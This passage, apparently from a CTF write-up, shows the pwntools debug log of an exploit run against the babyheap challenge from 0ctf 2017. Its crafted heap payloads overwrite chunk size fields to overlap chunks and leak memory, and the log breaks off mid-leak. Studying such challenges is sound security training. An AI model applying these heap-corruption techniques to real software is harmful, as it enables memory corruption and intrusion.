<h2 id="exp-debug"><a href="#exp-debug" class="headerlink" title="exp_debug"></a>exp_debug</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop python yichen_exp.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./babyheap_0ctf_2017_patch&#x27;</span> argv=[<span class="string">&#x27;./babyheap_0ctf_2017_patch&#x27;</span>] : pid <span class="number">15293</span></span><br><span class="line">[DEBUG] PLT <span class="number">0x9b0</span> <span class="built_in">free</span></span><br><span class="line">[DEBUG] PLT <span class="number">0x9b8</span> __errno_location</span><br><span class="line">[DEBUG] PLT <span class="number">0x9c0</span> <span class="built_in">puts</span></span><br><span class="line">[DEBUG] PLT <span class="number">0x9c8</span> write</span><br><span class="line">[DEBUG] PLT <span class="number">0x9d0</span> __stack_chk_fail</span><br><span class="line">[DEBUG] PLT <span class="number">0x9d8</span> mmap</span><br><span class="line">[DEBUG] PLT <span class="number">0x9e0</span> <span class="built_in">printf</span></span><br><span class="line">[DEBUG] PLT <span class="number">0x9e8</span> alarm</span><br><span class="line">[DEBUG] PLT <span class="number">0x9f0</span> close</span><br><span class="line">[DEBUG] PLT <span class="number">0x9f8</span> read</span><br><span class="line">[DEBUG] PLT <span class="number">0xa00</span> __libc_start_main</span><br><span class="line">[DEBUG] PLT <span class="number">0xa08</span> <span class="built_in">calloc</span></span><br><span class="line">[DEBUG] PLT <span class="number">0xa10</span> __gmon_start__</span><br><span class="line">[DEBUG] PLT <span class="number">0xa18</span> setvbuf</span><br><span class="line">[DEBUG] PLT <span class="number">0xa20</span> atol</span><br><span class="line">[DEBUG] PLT <span class="number">0xa28</span> open</span><br><span class="line">[DEBUG] PLT <span class="number">0xa30</span> <span class="built_in">exit</span></span><br><span class="line">[DEBUG] PLT <span class="number">0xa38</span> __cxa_finalize</span><br><span class="line">[*] <span class="string">&#x27;/home/ubuntu/Desktop/babyheap_0ctf_2017_patch&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[DEBUG] Received <span class="number">0x53</span> bytes:</span><br><span class="line">    <span class="string">&#x27;===== Baby Heap in 2017 =====\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;16\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x46</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Allocate Index 0\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;16\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x46</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Allocate Index 1\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;16\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x46</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Allocate Index 2\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;16\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x46</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Allocate Index 3\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line">    <span class="string">&#x27;128\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x46</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Allocate Index 4\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x7</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Index: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x35</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x7</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Index: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x35</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x7</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Index: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;0\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;65\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x9</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Content: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x41</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">21</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│!···│····│</span><br><span class="line">    <span class="number">00000020</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│</span><br><span class="line">    <span class="number">00000030</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">21</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│!···│····│</span><br><span class="line">    <span class="number">00000040</span>  <span class="number">80</span>                                                  │·│</span><br><span class="line">    <span class="number">00000041</span></span><br><span class="line">[DEBUG] Received <span class="number">0x35</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x7</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Index: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;32\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x9</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Content: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x20</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">21</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│!···│····│</span><br><span class="line">    <span class="number">00000020</span></span><br><span class="line">[DEBUG] Received <span class="number">0x35</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;16\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x46</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Allocate Index 1\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;16\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x46</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Allocate Index 2\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x7</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Index: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;32\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x9</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Content: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x20</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">91</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│</span><br><span class="line">    <span class="number">00000020</span></span><br><span class="line">[DEBUG] Received <span class="number">0x35</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Size: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line">    <span class="string">&#x27;128\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x46</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Allocate Index 5\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x7</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Index: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;4\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x35</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1. Allocate\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. Fill\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. Free\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4. Dump\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5. Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Command: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;4\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x7</span> bytes:</span><br><span class="line">    <span class="string">&#x27;Index: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x50</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">43</span> <span class="number">6f</span> <span 